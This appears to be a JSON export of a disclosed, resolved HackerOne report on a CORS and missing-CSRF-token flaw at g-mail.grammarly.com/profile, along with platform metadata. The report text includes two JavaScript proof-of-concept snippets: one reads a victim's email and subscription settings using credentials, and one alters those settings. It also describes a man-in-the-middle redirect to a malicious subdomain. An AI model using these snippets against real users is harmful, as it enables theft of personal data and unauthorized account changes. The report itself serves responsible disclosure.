@@ -1,0 +1,226 @@
+{
+  "id": 629892,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Mjk4OTI=",
+  "url": "https://hackerone.com/reports/629892",
+  "title": "Lack of CSRF header validation at https://g-mail.grammarly.com/profile",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-06-26T08:34:39.923Z",
+  "submitted_at": "2019-06-26T08:34:39.923Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "orlserg",
+    "url": "/orlserg",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/344/557/e52419d580024b46dfc518300c1293bb341bc0e8_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22746,
+    "url": "https://hackerone.com/superhuman",
+    "handle": "superhuman",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/23p3otm27f7hjxfsde7xx0ol3jhf/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/23p3otm27f7hjxfsde7xx0ol3jhf/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Superhuman (formerly Grammarly)",
+      "twitter_handle": "",
+      "website": "https://superhuman.com/",
+      "about": "Superhuman (formerly Grammarly) unites Grammarly, Superhuman Mail, Coda, and Go with AI to unlock superhuman potential in everyone."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-10-31T03:57:12.157Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-10-31T03:57:12.058Z",
+  "team_member_agreed_on_going_public_at": "2019-10-30T13:21:44.481Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello!\n\n## Description\nI found that setting up a CORS in some places will check the protocol, but it allows using http scheme. In addition, any subdomain is considered trusted. If the origin is *http://www.grammarly.com*, then the server will respond: *Access-Control-Allow-Origin: http://www.grammarly.com*. That can lead to leakage of user data and unauthorized actions on behalf of the user.\n{F517015}\n\nIn fact, this means that an attacker can use the MITM attack (Wi-Fi, local networks, etc.) to substitute client requests, thus replacing the origin. \n\n####*Important note: I very carefully read the program policy and focus on the fact that MITM attack is not made on the existent grammarly sites.*\n\n## How it works\n{F517002}\n\nIf an attacker can perform a mitm attack on a user, he can replace the requested content of any unencrypted request and produce a 302 redirect of the user to http: //evil.grammarly.com. Since the request is not unencrypted, the attacker can also replace the response and implement javascript that performs a requests to vulnerable endpoints. Thus, the vulnerable enpoint will think that the request came from the origin of the trust it trusts and will execute the request.\n\nUsing a header to send a CSRF token protects against such attacks. But I found a place where verification of the transferred token is not performed.\n\nThis vulnerability was perfectly described by James Kettle on OWASP AppSec EU 2017. You can watch the description of the vulnerability on the link to his presentation. https://youtu.be/wgkj4ZgxI4c?t=1139\n\n## Vulnerable enpoints\n\n1) The malicious javascript will look like:\n\n```javascript\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\n   if (this.readyState == 4 && this.status == 200) {\n       document.getElementById(\"response-node\").innerHTML = this.responseText;\n   }\n};\nxhttp.open(\"GET\", \"https://g-mail.grammarly.com/profile\", true);\nxhttp.withCredentials = true;\nxhttp.send();\n```\nThe response will contain the user's email address and subscription settings:\n```\n{\"id\":749327815,\"email\":\"email@yandex.ru\",\"preferenceFields\":[{\"name\":\"Weekly Progress Reports\",\"description\":\"Get a weekly report with statistics and insights on how you are writing with Grammarly.\",\"order\":49,\"value\":true},{\"name\":\"Product Updates\",\"description\":\"Important info on new features and products. We may also ask for your feedback on occasion.\",\"order\":50,\"value\":true},{\"name\":\"Grammarly Offers\",\"description\":\"These emails may include special upgrade offers, limited-time events, or coupons. \",\"order\":50,\"value\":true},{\"name\":\"The Grammarly Blog\",\"description\":\"A weekly newsletter that includes fun tips on all things writing.\",\"order\":50,\"value\":true},{\"name\":\"Grammarly Business\",\"description\":\"Updates and information on our products for multi-person teams.\",\"order\":55,\"value\":true}],\"unsubscribe\":false}\n``` \n\n2) The malicious javascript will look like:\n\n```javascript\nvar xhttp = new XMLHttpRequest();\nvar data = new FormData();\ndata.append(\"email\", \"████████\");\ndata.append(\"unsubscribe\", \"false\");\n(...)\nxhttp.open(\"POST\", \"https://g-mail.grammarly.com/profile\", true);\nxhttp.withCredentials = true;\nxhttp.send(data);\n```\nThe request will change the subscription settings. It looks like CSRF.\n\nNow I'm trying to find more places to increase the impact.\n\n## Impact\n\nCORS misconfiguration lead to leakage of user data and unauthorized actions on behalf of the user.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 517002,
+      "file_name": "CORS.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/002/5314045f608f7d9a3c59bd50991770fae7e3a678/CORS.png?response-content-disposition=attachment%3B%20filename%3D%22CORS.png%22%3B%20filename%2A%3DUTF-8%27%27CORS.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGN7XD4Z%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052326Z&X-Amz-Expires=1484&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF%2B5%2BqpNMYJJlMLXTQB%2FNI5c1baiBprHteIHb1u%2FOfGlAiEApwVtVjeM46PngaVW2HuPeZb%2F0vzW72Wf4xM9ZO39WPQqsgUIeBADGgwwMTM2MTkyNzQ4NDkiDBFBTX43IU35qXwehiqPBTSnEqpCs5a1y%2FTKasIRX8XuSerVPmZrxMIVK71yKlczvS0Ij0PQ7D66W588V76Gmjmtfugm2sOyR3gudfjXNY5ANaBAHkpphyRMqMPc07qHXIWZ%2Fd2o9qR2NQYona60DZYYWEqSv394ytm5nSGmfwTGb3T%2Fo%2FhOAIo7XtHWIAyRyaG%2Fgp%2FkpoZNOl3zplW1LkBPox13ptwikymGgUCInJMpg781s3u1%2Fu4%2BYGPqbumR0iIn0w4wCizRLyZjfTRSLqe3bbqIvvM90KpZl53RMqW0ePFb%2FLRDOltdUGdP4IFaBZuoeUOjGvJ3858A9Q%2B%2B98%2Fz9ZMx%2B0firSZZUW9gO6n%2BOtGjZfjiJrW6%2FIBvvODvtR6ToxoA8JeZGGWxggYqkJKKI0nEwtsrinBY7Oaa8nb%2BdM3OTsF%2BHCJWldD2tjwF9ovlsr9isp7CRPRTVRLPrzQlqnOiytmGUGKD9QKlEOuaCMJNbLefxcHaqjfbQVwei4KQWAS32dwZZl8VmCQRSfrHCf3r30y5JWGJBnfS5NGmdRnddL0e6qD%2FUXU9iqrQZTbPkv3A2qw17yKyq4p76icLxY4oaa1P8ErD3Z2DOi2tTGsr%2FuFM11wSCcRyjo0dK22v7L9mKJD%2Fq3F3UX9%2BIodBZm7%2FT0bNmG%2FC6lEwnl8Wp8dfMASgNU0uok93DIJIcZRZVUh%2FbUdZhWj%2BYwj%2F%2BalHLtF17KEc%2BXAm%2BOky0NJGmbpNj40wfpkSijUnOi2Pnu7qB%2BTvuhpcaY5UL58o6iWLwlFPrklhdPl9i4OxTRJ6ONkBU%2BdmAt0B%2FLmVY%2Bp71GfDBaI%2BeTQXLoPbRGJwkibE4pOdabL%2FIBkwa2%2BktfOJcKOHIidZHOGoQoGIiU0w8pK20gY6sQHK5YykznnJepz0LTyM%2FMEZGJy5ZBWU19MO5zwxpT7MOKrgPpBFtBB0ANinm2FNxr9asVpeZak35MEHxMfWE%2F%2BN97DnMzrznod5KkVcmDuC58i81J6g0%2FuciCmzEIVJcflRAZrbHBlnq3hzd7C2xvfHhxFfbNawLi5afmJslsFDH0k7HWXWz%2BgrnhJpVK7UByTR%2Bt1KDyVIVtuxP5ZJpGY2Jr1tKjgZnUcTL7frXQX72Vw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bbe887222dc2191fde229a66065bac6f23d76268f2775b93fe0dc7ec35b55866",
+      "file_size": 145999,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 517015,
+      "file_name": "burp.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/015/406cdd11968ad8a0378c32ecdaceba07880db2c2/burp.png?response-content-disposition=attachment%3B%20filename%3D%22burp.png%22%3B%20filename%2A%3DUTF-8%27%27burp.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGN7XD4Z%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052326Z&X-Amz-Expires=1484&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF%2B5%2BqpNMYJJlMLXTQB%2FNI5c1baiBprHteIHb1u%2FOfGlAiEApwVtVjeM46PngaVW2HuPeZb%2F0vzW72Wf4xM9ZO39WPQqsgUIeBADGgwwMTM2MTkyNzQ4NDkiDBFBTX43IU35qXwehiqPBTSnEqpCs5a1y%2FTKasIRX8XuSerVPmZrxMIVK71yKlczvS0Ij0PQ7D66W588V76Gmjmtfugm2sOyR3gudfjXNY5ANaBAHkpphyRMqMPc07qHXIWZ%2Fd2o9qR2NQYona60DZYYWEqSv394ytm5nSGmfwTGb3T%2Fo%2FhOAIo7XtHWIAyRyaG%2Fgp%2FkpoZNOl3zplW1LkBPox13ptwikymGgUCInJMpg781s3u1%2Fu4%2BYGPqbumR0iIn0w4wCizRLyZjfTRSLqe3bbqIvvM90KpZl53RMqW0ePFb%2FLRDOltdUGdP4IFaBZuoeUOjGvJ3858A9Q%2B%2B98%2Fz9ZMx%2B0firSZZUW9gO6n%2BOtGjZfjiJrW6%2FIBvvODvtR6ToxoA8JeZGGWxggYqkJKKI0nEwtsrinBY7Oaa8nb%2BdM3OTsF%2BHCJWldD2tjwF9ovlsr9isp7CRPRTVRLPrzQlqnOiytmGUGKD9QKlEOuaCMJNbLefxcHaqjfbQVwei4KQWAS32dwZZl8VmCQRSfrHCf3r30y5JWGJBnfS5NGmdRnddL0e6qD%2FUXU9iqrQZTbPkv3A2qw17yKyq4p76icLxY4oaa1P8ErD3Z2DOi2tTGsr%2FuFM11wSCcRyjo0dK22v7L9mKJD%2Fq3F3UX9%2BIodBZm7%2FT0bNmG%2FC6lEwnl8Wp8dfMASgNU0uok93DIJIcZRZVUh%2FbUdZhWj%2BYwj%2F%2BalHLtF17KEc%2BXAm%2BOky0NJGmbpNj40wfpkSijUnOi2Pnu7qB%2BTvuhpcaY5UL58o6iWLwlFPrklhdPl9i4OxTRJ6ONkBU%2BdmAt0B%2FLmVY%2Bp71GfDBaI%2BeTQXLoPbRGJwkibE4pOdabL%2FIBkwa2%2BktfOJcKOHIidZHOGoQoGIiU0w8pK20gY6sQHK5YykznnJepz0LTyM%2FMEZGJy5ZBWU19MO5zwxpT7MOKrgPpBFtBB0ANinm2FNxr9asVpeZak35MEHxMfWE%2F%2BN97DnMzrznod5KkVcmDuC58i81J6g0%2FuciCmzEIVJcflRAZrbHBlnq3hzd7C2xvfHhxFfbNawLi5afmJslsFDH0k7HWXWz%2BgrnhJpVK7UByTR%2Bt1KDyVIVtuxP5ZJpGY2Jr1tKjgZnUcTL7frXQX72Vw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1fafbbbf86deafff4b03286db934479c7fb88528282d01dedce280954d56a2cf",
+      "file_size": 61532,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-11-29T13:21:44.583Z",
+  "allow_singular_disclosure_after": -208454501.90940994,
+  "singular_disclosure_allowed": true,
+  "vote_count": 139,
+  "voters": [
+    "megaknight",
+    "dls_",
+    "nicochess",
+    "orange303",
+    "coder_mohammed",
+    "d0kkillo",
+    "base_64",
+    "orlserg",
+    "sameerphad72",
+    "metnew",
+    "and 129 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.2,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 1366,
+    "asset_type": "URL",
+    "asset_identifier": "www.grammarly.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "629892",
+  "votes": 139,
+  "latest_disclosable_activity_at": "2019-10-31T03:57:12.188Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:23:26.607500",
+    "source": "https://hackerone.com/reports/629892.json",
+    "report_id": 629892
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Mjk4OTI=",
+    "databaseId": "629892",
+    "title": "Lack of CSRF header validation at https://g-mail.grammarly.com/profile",
+    "url": "https://hackerone.com/reports/629892",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2019-10-31T03:57:12.157Z",
+    "created_at": "2019-06-26T08:34:39.923Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzE4",
+      "name": "Information Disclosure",
+      "external_id": "cwe-200"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": 4.2
+    },
+    "reporter": {
+      "username": "orlserg"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIyNzQ2",
+      "handle": "superhuman",
+      "name": "Superhuman (formerly Grammarly)",
+      "url": "https://hackerone.com/superhuman",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8xNDUxMzE=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2019-06-27T16:27:36.110Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzYyOTg5Mg==",
+    "_id": "629892",
+    "disclosed": true,
+    "votes": 139,
+    "latest_disclosable_activity_at": "2019-10-31T03:57:12.188Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Mjk4OTI=",
+      "databaseId": "629892",
+      "title": "Lack of CSRF header validation at https://g-mail.grammarly.com/profile",
+      "url": "https://hackerone.com/reports/629892",
+      "disclosed_at": "2019-10-31T03:57:12.157Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIyNzQ2",
+      "handle": "superhuman",
+      "name": "Superhuman (formerly Grammarly)",
+      "url": "https://hackerone.com/superhuman",
+      "currency": "usd"
+    }
+  }
+}
